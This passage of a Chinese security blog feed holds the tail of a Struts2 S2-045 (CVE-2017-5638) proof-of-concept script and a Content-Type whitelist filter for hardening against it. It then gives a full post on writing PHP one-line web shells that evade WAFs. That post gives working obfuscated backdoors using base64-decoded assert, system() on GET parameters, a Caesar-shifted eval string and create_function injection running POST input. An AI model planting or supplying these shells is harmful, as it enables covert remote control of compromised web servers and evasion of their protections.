raw_input(<span class="string">"set url :"</span>)</div><div class="line">            th[<span class="string">'url'</span>] = url</div><div class="line">        <span class="keyword">elif</span> input_cmd == <span class="string">'show url'</span>:</div><div class="line">            <span class="keyword">print</span> th.get(<span class="string">"url"</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            Poc(th.get(<span class="string">"url"</span>),input_cmd)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        url = raw_input(<span class="string">"set url :"</span>)</div><div class="line">        th[<span class="string">"url"</span>] = url</div></pre></td></tr></table></figure>
<h2 id="加固方式"><a href="#加固方式" class="headerlink" title="加固方式"></a>加固方式</h2><h3 id="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"><a href="#通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。" class="headerlink" title="通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。"></a>通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> javax.servlet.Filter;</div><div class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</div><div class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletException;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecurityFilter</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="comment">/**</span></div><div class="line">	 * </div><div class="line">	 */</div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</div><div class="line">	</div><div class="line">	</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String www_url_encode= <span class="string">"application/x-www-form-urlencoded"</span>;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String mul_data= <span class="string">"multipart/form-data "</span>;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">final</span> String txt_pla= <span class="string">"text/plain"</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1,</span></span></div><div class="line">			FilterChain arg2) <span class="keyword">throws</span> IOException, ServletException &#123;</div><div class="line"></div><div class="line">		HttpServletRequest request = (HttpServletRequest) arg0;</div><div class="line">		HttpServletResponse response = (HttpServletResponse) arg1;</div><div class="line">		</div><div class="line">		String contenType=request.getHeader(<span class="string">"conTent-type"</span>);</div><div class="line">		</div><div class="line">		<span class="keyword">if</span>(contenType!=<span class="keyword">null</span>&amp;&amp;!contenType.equals(<span class="string">""</span>)&amp;&amp;!contenType.equalsIgnoreCase(www_url_encode)&amp;&amp;!contenType.equalsIgnoreCase(mul_data)&amp;&amp;!contenType.equalsIgnoreCase(txt_pla))&#123;</div><div class="line">			</div><div class="line">			response.setContentType(<span class="string">"text/html;charset=UTF-8"</span>);</div><div class="line">			response.getWriter().write(<span class="string">"非法请求Content-Type！"</span>);</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		arg2.doFilter(request, response);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下"><a href="#将Java编译以后的“SecurityFilter-class”（SecurityFilter-java是源代码文件）复制到应用的WEB-INF-classes目录下" class="headerlink" title="将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下"></a>将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下</h3><h3 id="⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中"><a href="#⦁-配置Filter-将下面的代码加入WEB-INF-web-xml文件中" class="headerlink" title="⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中"></a>⦁    配置Filter 将下面的代码加入WEB-INF/web.xml文件中</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;filter&gt;</div><div class="line">    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;</div><div class="line">    &lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt;</div><div class="line">  &lt;/filter&gt;</div><div class="line">&lt;filter-mapping&gt;</div><div class="line">    &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt;</div><div class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</div><div class="line">&lt;/filter-mapping&gt;</div></pre></td></tr></table></figure>
<h3 id="代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。"><a href="#代表拦截所有请求，进行攻击代码检查，-action只检查-action结尾的请求。" class="headerlink" title="/代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。"></a>/<em>代表拦截所有请求，进行攻击代码检查，</em>.action只检查.action结尾的请求。</h3><h3 id="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器"><a href="#如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到-Apache-Struts-2-3-32或2-5-10-1版；或者也可以切换到不同的实现文件上传Multipart解析器" class="headerlink" title="如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器"></a>如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 <a href="https://repository.apache.org/content/groups/staging/org/apache/struts/struts2-core/2.3.32/" target="_blank" rel="external">Apache Struts 2.3.32</a>或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器</h3><h3 id="重启应用即可"><a href="#重启应用即可" class="headerlink" title="重启应用即可"></a>重启应用即可</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;a href=&quot;#近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike-zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot; class=&quot;headerlink&quot; title=&quot;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&quot;&gt;&lt;/a&gt;近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。&lt;/h3&gt;&lt;h2 id=&quot;漏洞编号&quot;&gt;&lt;a href=&quot;#漏洞编号&quot; class=&quot;headerlink&quot; title=&quot;漏洞编号&quot;&gt;&lt;/a&gt;漏洞编号&lt;/h2&gt;&lt;h3 id=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;a href=&quot;#S2-045，CVE-2017-5638&quot; class=&quot;headerlink&quot; title=&quot;S2-045，CVE-2017-5638&quot;&gt;&lt;/a&gt;S2-045，CVE-2017-5638&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="S2-045" scheme="http://iosmosis.github.io/tags/S2-045/"/>
    
      <category term="poc" scheme="http://iosmosis.github.io/tags/poc/"/>
    
      <category term="exp" scheme="http://iosmosis.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>一句话Shell编写思路</title>
    <link href="http://iosmosis.github.io/2017/03/05/oneshell/"/>
    <id>http://iosmosis.github.io/2017/03/05/oneshell/</id>
    <published>2017-03-05T04:47:01.000Z</published>
    <updated>2017-04-08T15:14:10.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路"><a href="#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路" class="headerlink" title="很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路"></a>很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路</h3><ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文="">

</the></li>
</ul>
<h2 id="经典方式"><a href="#经典方式" class="headerlink" title="经典方式"></a>经典方式</h2><h3 id="应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如："><a href="#应该是很常见的方法-利用-可变变量进行赋值传值来打到过狗目的，例如：" class="headerlink" title="应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如："></a>应该是很常见的方法 利用 <a href="http://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="external">可变变量</a>进行赋值传值来打到过狗目的，例如：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $jg16=base64_decode;</div><div class="line">$z=$jg16(YXNzZXJ0);</div><div class="line">$z($_POST[q]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">这个一句话需要用到这个函数</div><div class="line"><span class="comment">//base64_encode();//base64编码</span></div><div class="line"><span class="comment">//base64_decode();//base64解码</span></div><div class="line">主要就是进行加密然后传值绕过对一句话的检测　这次暂不详细讲解</div></pre></td></tr></table></figure>
<p>##system()的巧妙利用</p>
<p>##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system($_GET[‘a’]($_GET[‘b’]))</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="利用古典密码进行对shell加密"><a href="#利用古典密码进行对shell加密" class="headerlink" title="利用古典密码进行对shell加密"></a>利用古典密码进行对shell加密</h2><h3 id="在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）"><a href="#在CTF中-经常会碰到密码学问题-比如古典密码（凯撒加密-rot13-等等）" class="headerlink" title="在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）"></a>在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">kaisa</span><span class="params">($arr)</span></span>&#123;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-6</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $arr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"><a href="#这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话" class="headerlink" title="这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话"></a>这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$arr=<span class="string">"j&#123;fq-)dUTXY`&#125;b.@"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt; strlen($arr);$i++)&#123;</div><div class="line">$arr[$i]=chr(ord($arr[$i])<span class="number">-5</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>($arr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="利用函数代码执行来代替eval"><a href="#利用函数代码执行来代替eval" class="headerlink" title="利用函数代码执行来代替eval"></a>利用函数代码执行来代替eval</h2><h3 id="利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行"><a href="#利用-create-function代码执行漏洞-该函数漏洞这里不进行详细讲解-。-create-function要接收两个参数-args和-code来组成新的函数fucntion-lambda-func-args-code-并eval-function-lambda-func-args-code-，那么我们只要构造-code来闭合-然后将自己的代码放到函数体外面就可以执行" class="headerlink" title="利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行"></a>利用 <a href="http://www.cnseay.com/1901/" target="_blank" rel="external">create_function代码执行漏洞</a> 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行</h3><p>这里构造为$code = “n;}$_POST[x];/*”;<br>注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">payload解析：</div><div class="line"> </div><div class="line">;来结束语句</div><div class="line"> </div><div class="line">&#125;来结束函数体</div><div class="line"> </div><div class="line">phpinfo();;就在函数体外面被<span class="keyword">eval</span>执行了</div><div class="line"> </div><div class="line"><span class="comment">/*注释多余的代码</span></div><div class="line"> </div><div class="line">最终代码：eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;)</div><div class="line">最终构造出</div><div class="line"></div><div class="line">&lt;?php</div><div class="line">$args = "１";</div><div class="line">$code = "n;&#125;$_POST[x];/*";</div><div class="line">echo create_function('$args',$code);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起"><a href="#这些思路-只是用来启发大家-如果更好的思路-可以一起分享-我会整合到一起" class="headerlink" title="这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起"></a>这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot;&gt;&lt;a href=&quot;#很多人都头痛-好不容易找到上传点拿shell了-却发现有狗-其实过狗并不是很难-所以我在这里总结一下思路&quot; class=&quot;headerlink&quot; title=&quot;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&quot;&gt;&lt;/a&gt;很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="shell" scheme="http://iosmosis.github.io/tags/shell/"/>
    
      <category term="waf" scheme="http://iosmosis.github.io/tags/waf/"/>
    
  </entry>
  
</feed>
